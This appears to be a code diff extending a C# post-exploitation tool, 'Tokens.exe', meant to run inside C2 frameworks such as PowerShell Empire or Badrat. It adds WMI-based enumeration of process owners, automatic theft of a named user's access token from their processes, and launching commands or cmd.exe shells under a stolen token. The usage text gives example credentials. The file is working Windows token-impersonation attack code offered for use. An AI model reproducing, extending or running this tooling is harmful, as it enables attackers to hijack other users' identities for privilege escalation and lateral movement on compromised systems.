@@ -1,8 +1,10 @@
 using System;
+using System.Linq;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Diagnostics;
+using System.Management; // You must add the reference to System.Management
 
 // Note: this code is meant to be run via some sort of execute-assembly style CLR harness that does *not*
 // perform a fork-n-run: (e.g.: Powershell Empire's Invoke-Assembly, Badrat's C# rat csharp command).
@@ -206,6 +208,14 @@ public class Program
         SidTypeComputer
     }
 
+    private struct ProcessInformation
+    {
+        public IntPtr process;
+        public IntPtr thread;
+        public int processId;
+        public int threadId;
+    }
+
     public const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
 
     // pinvoke functions section
@@ -265,11 +275,12 @@ public class Program
     }
 
     public static List<TokenEntry> TokenList;
+    public static IntPtr CurrentToken = WindowsIdentity.GetCurrent().AccessToken.DangerousGetHandle();
 
     // functions section
     private static void InitTokenList()
     {
-        if(Object.Equals(TokenList, default(List<TokenEntry>))) // uninitialized TokenEntry list
+        if (Object.Equals(TokenList, default(List<TokenEntry>))) // uninitialized TokenEntry list
         {
             // Initialize new TokenEntry list
             TokenList = new List<TokenEntry>();
@@ -309,7 +320,7 @@ public class Program
     }
     private static bool UseToken(int index)
     {
-        if(index > TokenList.Count || index < 1)
+        if (index > TokenList.Count || index < 1)
         {
             Console.WriteLine("Invalid token index - out of range: 1 - " + TokenList.Count);
             return false;
@@ -322,12 +333,15 @@ public class Program
             CloseHandle(hToken);
             return false;
         }
+        CurrentToken = hToken;
+        var identity = new WindowsIdentity(CurrentToken);
+        WindowsImpersonationContext impersonatedUser = identity.Impersonate();
         Console.WriteLine("Switched to token #" + index);
         return true;
     }
     private static bool MakeToken(string domain, string username, string password)
     {
-        if(!LogonUser(username, domain, password, LogonProvider.LOGON32_LOGON_INTERACTIVE,
+        if (!LogonUser(username, domain, password, LogonProvider.LOGON32_LOGON_INTERACTIVE,
             LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out var hToken))
         {
             Console.WriteLine("Error: Couldn't LogonUser with username:password \""
@@ -336,13 +350,16 @@ public class Program
         }
 
         Rev2Self();
-        if(!ImpersonateLoggedOnUser(hToken))
+        if (!ImpersonateLoggedOnUser(hToken))
         {
             Console.WriteLine("Succesfully made token, but ImpersonateLoggedOnUser failed: " + Marshal.GetLastWin32Error());
             CloseHandle(hToken);
             return false;
         }
-            
+
+        CurrentToken = hToken;
+        var identity = new WindowsIdentity(CurrentToken);
+        WindowsImpersonationContext impersonatedUser = identity.Impersonate();
         AddToken(hToken, 0); // Add the token we made to the Token List...
         Console.WriteLine("Successfully made token with username:password \"" + domain + "\\" + username + ":" + password + "\"");
         return true;
@@ -364,21 +381,21 @@ public class Program
         }
 
         processHandle = OpenProcess((uint)ProcessAccessRights.PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
-        if(processHandle == IntPtr.Zero)
+        if (processHandle == IntPtr.Zero)
         {
             Console.WriteLine("Error: Couldn't OpenProcess to pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
             return false;
         }
 
-        if(!OpenProcessToken(processHandle, DesiredAccess.TOKEN_QUERY | 
+        if (!OpenProcessToken(processHandle, DesiredAccess.TOKEN_QUERY |
             DesiredAccess.TOKEN_DUPLICATE | DesiredAccess.TOKEN_IMPERSONATE,
             out tokenHandle))
         {
             Console.WriteLine("Error: Couldn't OpenProcessToken to pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
             return false;
         }
-            
-        if(!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, IntPtr.Zero,
+
+        if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, IntPtr.Zero,
             SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary,
             out dupTokenHandle))
         {
@@ -386,14 +403,166 @@ public class Program
             return false;
         }
 
-        if(!ImpersonateLoggedOnUser(dupTokenHandle))
+        if (!ImpersonateLoggedOnUser(dupTokenHandle))
         {
             Console.WriteLine("Could not ImpersonateLoggedOnUser for pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
             return false;
         }
 
+        CurrentToken = dupTokenHandle;
+        var identity = new WindowsIdentity(CurrentToken);
+        WindowsImpersonationContext impersonatedUser = identity.Impersonate();
         AddToken(dupTokenHandle, pid); // Add the token we made to the Token List...
         Console.WriteLine("Successfully impersonated token from pid " + pid.ToString());
+        return true;
+    }
+    private static List<Int32> SampleProcesses(string username = null)
+    {
+        // Give a list of processes belonging to a specific user,
+        // or if no user given, sample one process from each unique user
+
+        List<Int32> pids = new List<Int32>();
+        Dictionary<Int32, String> owners = new Dictionary<Int32, String>();
+        int biggestOwnerSize = 5; // Column must be at least (but possibly greater) than 5 chars wide: O W N E R
+
+        // Get a list of all processes
+        Process[] processes = Process.GetProcesses();
+
+        // Set up WMI connection. We're going to use this to get the owner of every process
+        ManagementScope scope = new ManagementScope(@"\\.\root\cimv2");
+        scope.Connect();
+        ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
+        ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
+        ManagementObjectCollection objectCollection = objectSearcher.Get();
+
+        // This takes a long time...
+        foreach (ManagementObject managementObject in objectCollection)
+        {
+            String[] owner = new String[2];
+            try
+            {
+                managementObject.InvokeMethod("GetOwner", owner);
+            }
+            catch
+            {
+                owner[0] = null;
+            }
+            String name = owner[0] != null ? owner[1] + "\\" + owner[0] : null;
+            owners[Convert.ToInt32(managementObject["Handle"])] = name;
+            if (name != null && name.Length > biggestOwnerSize)
+            {
+                biggestOwnerSize = name.Length;
+            }
+        }
+
+        if (username == null)
+        {
+            Dictionary<Int32, String> uniqueOwners = new Dictionary<Int32, String>();
+            foreach (KeyValuePair<Int32, String> keyValuePair in owners)
+            {
+                if (keyValuePair.Value != null && !uniqueOwners.ContainsValue(keyValuePair.Value))
+                {
+                    uniqueOwners[keyValuePair.Key] = keyValuePair.Value;
+                }
+            }
+            if (uniqueOwners.Count != 0)
+            {
+                Console.WriteLine("PID     Owner" + new string(' ', biggestOwnerSize - 5) + "   Process Name");
+                Console.WriteLine("=====   =====" + new string('=', biggestOwnerSize - 5) + "   ============");
+                foreach (KeyValuePair<Int32, String> keyValuePair in uniqueOwners)
+                {
+                    try
+                    {
+                        Console.WriteLine(keyValuePair.Key.ToString() + new string(' ', 8 - keyValuePair.Key.ToString().Length) + keyValuePair.Value + new string(' ', biggestOwnerSize - keyValuePair.Value.Length + 3) + Process.GetProcessById(keyValuePair.Key).ProcessName);
+                    }
+                    catch
+                    {
+                        Console.WriteLine($"[!] Error getting info on process {keyValuePair.Key}");
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("[!] Could not sample processes for all users!");
+            }
+        }
+        // Don't print, just return the list of PIDs belonging to that user
+        else
+        {
+            foreach (KeyValuePair<Int32, String> keyValuePair in owners)
+            {
+                if(keyValuePair.Value != null && keyValuePair.Value == username)
+                {
+                    pids.Add(keyValuePair.Key);
+                }
+            }
+        }
+        return pids;
+    }
+    private static bool ImpersonateUser(string username)
+    {
+        List<Int32> pids = SampleProcesses(username);
+        if(pids.Count == 0)
+        {
+            Console.WriteLine($"[!] No processes found for user {username}. Make sure to include the domain in the user as DOMIN\\username format");
+            return false;
+        }
+        foreach (Int32 pid in pids)
+        {
+            if(StealToken(pid))
+            {
+                return true;
+            }
+        }
+        Console.WriteLine($"[!] Attempted to impersonate user {username} failed! ({pids.Count} processes tried)");
+        return false;
+    }
+    private static string parseArgs(string[] args)
+    {
+        // Used only for CreateProcessWithToken to parse command line arguments
+        string result = "";
+        int count = 1;
+
+        // basically just wrap args that contain spaces in quotes. All others, just add to the string
+        foreach (string arg in args)
+        {
+            if (arg.Contains(' '))
+            {
+                result += '"' + arg + '"';
+            }
+            else
+            {
+                result += arg;
+            }
+            if (count != args.Length)
+            {
+                result += " ";
+            }
+            count++;
+        }
+        return result;
+    }
+    private static bool CreateProcessWithToken(string command, bool shell = false, bool output = false)
+    {
+        string processPath = null; // The lpApplicationName parameter can be NULL. In that case, the module name must be the first white space–delimited token in the lpCommandLine string.
+        string commandLine = null; // The lpCommandLine parameter can be NULL. In that case, the function uses the string pointed to by lpApplicationName as the command line.
+        if (shell)
+        {
+            processPath = "cmd.exe";
+            commandLine = "/c " + command;
+        }
+        else
+        {
+            commandLine = command;
+        }
+
+        var si = new STARTUPINFO();
+        var pi = new PROCESS_INFORMATION();
+        if(!CreateProcessWithTokenW(CurrentToken, 0, processPath, commandLine, (CreationFlags)IntPtr.Zero, IntPtr.Zero, null, ref si, out pi))
+        {
+            Console.WriteLine("Could not CreateProcessWithTokenW! Error: " + Marshal.GetLastWin32Error());
+            return false;
+        }
         return true;
     }
     private static bool Rev2Self()
@@ -406,21 +575,27 @@ public class Program
     }
     private static void usage()
     {
-        Console.WriteLine("Usage:   Tokens.exe <function> [args]\n");
-        Console.WriteLine("Usage:   Tokens.exe steal_token <pid>");
-        Console.WriteLine("Usage:   Tokens.exe make_token <domain> <username> <password>");
-        Console.WriteLine("Usage:   Tokens.exe list_tokens");
-        Console.WriteLine("Usage:   Tokens.exe use_token <token_id>");
-        Console.WriteLine("Usage:   Tokens.exe whoami");
-        Console.WriteLine("Usage:   Tokens.exe rev2self\n");
-        Console.WriteLine("Example: Tokens.exe steal_token 4468");
-        Console.WriteLine("Example: Tokens.exe make_token borgar kclark Summer2019!");
-        Console.WriteLine("Example: Tokens.exe list_tokens");
-        Console.WriteLine("Example: Tokens.exe use_token 3");
-        Console.WriteLine("Example: Tokens.exe whoami");
-        Console.WriteLine("Example: Tokens.exe rev2self");
+        Console.WriteLine("Usage:     Tokens.exe <function> [args]\n");
+        Console.WriteLine("Usage:     Tokens.exe steal_token <pid>");
+        Console.WriteLine("Usage:     Tokens.exe make_token <domain> <username> <password>");
+        Console.WriteLine("Usage:     Tokens.exe list_tokens");
+        Console.WriteLine("Usage:     Tokens.exe sample_processes");
+        Console.WriteLine("Usage:     Tokens.exe impersonate_user <domain\\username>");
+        Console.WriteLine("Usage:     Tokens.exe create_process [--shell] <command> [command arguments ...]");
+        Console.WriteLine("Usage:     Tokens.exe use_token <token_id>");
+        Console.WriteLine("Usage:     Tokens.exe whoami");
+        Console.WriteLine("Usage:     Tokens.exe rev2self\n");
+        Console.WriteLine("Example:   Tokens.exe steal_token 4468");
+        Console.WriteLine("Example:   Tokens.exe make_token borgar kclark Summer2019!");
+        Console.WriteLine("Example:   Tokens.exe list_tokens");
+        Console.WriteLine("Example:   Tokens.exe sample_processes");
+        Console.WriteLine("Example:   Tokens.exe impersonate_user BORGAR\\kclark");
+        Console.WriteLine("Usage:     Tokens.exe create_process --shell whoami /all");
+        Console.WriteLine("Example:   Tokens.exe use_token 3");
+        Console.WriteLine("Example:   Tokens.exe whoami");
+        Console.WriteLine("Example:   Tokens.exe rev2self\n");
     }
-    public static int Main(string[] args)
+    public static void Main(string[] args)
     {
         InitTokenList();
 
@@ -429,11 +604,11 @@ public class Program
             usage();
         }
 
-        else if(args[0] == "steal_token")
+        else if (args[0] == "steal_token")
         {
-            if(int.TryParse(args[1], out int pid))
+            if (int.TryParse(args[1], out int pid))
             {
-                if(StealToken(pid))
+                if (StealToken(pid))
                 {
                     Console.WriteLine("Current user after impersonation: " + GetCurrentTokenUser());
                 }
@@ -443,25 +618,62 @@ public class Program
                 Console.WriteLine("Could not parse PID (" + args[1] + ") as an integer");
             }
         }
-        else if(args[0] == "make_token" && args.Length == 4)
+        else if (args[0] == "make_token" && args.Length == 4)
         {
             string domain = args[1];
             string username = args[2];
             string password = args[3];
-            if(MakeToken(domain, username, password))
+            if (MakeToken(domain, username, password))
             {
                 Console.WriteLine("Current user after token creation: " + GetCurrentTokenUser());
             }
         }
-        else if(args[0] == "list_tokens")
+        else if (args[0] == "list_tokens")
         {
             ListTokens();
         }
-        else if(args[0] == "use_token")
+        else if (args[0] == "impersonate_user")
+        {
+            if(args.Length > 1)
+            {
+                string username = args[1];
+                ImpersonateUser(username);
+            }
+            else
+            {
+                usage();
+            }
+        }
+        else if (args[0] == "sample_processes")
+        {
+            SampleProcesses();
+        }
+        else if (args[0] == "create_process")
+        {
+            if (args.Length > 1)
+            {
+                bool shell = false;
+                string commandLine = null;
+                int argsToSkip = 1; // Skip just one arg for "create_process", assume no --shell.
+                if (args[1] == "--shell")
+                {
+                    shell = true;
+                    argsToSkip = 2;
+                    commandLine = parseArgs(args.Skip(2).Take(args.Length).ToArray()); // args[1:] and parse them into a string
+                }
+                commandLine = parseArgs(args.Skip(argsToSkip).Take(args.Length).ToArray());
+                CreateProcessWithToken(commandLine, shell);
+            }
+            else
+            {
+                usage();
+            }
+        }
+        else if (args[0] == "use_token")
         {
             if (int.TryParse(args[1], out int index))
             {
-                if(UseToken(index))
+                if (UseToken(index))
                 {
                     Console.WriteLine("Current user after switching tokens: " + GetCurrentTokenUser());
                 }
@@ -478,11 +690,12 @@ public class Program
         else if (args[0] == "rev2self")
         {
             Rev2Self();
+            CurrentToken = WindowsIdentity.GetCurrent().AccessToken.DangerousGetHandle();
             Console.WriteLine("Current user after rev2self: " + GetCurrentTokenUser());
         }
-        else if(args[0] == "interactive") // Used for testing only
+        else if (args[0] == "interactive") // Used for testing only
         {
-            while(true)
+            while (true)
             {
                 Console.Write("Input > ");
                 string[] input = Console.ReadLine().Split(' ');
@@ -493,7 +706,5 @@ public class Program
         {
             usage();
         }
-        return 0;
     }
 }
-
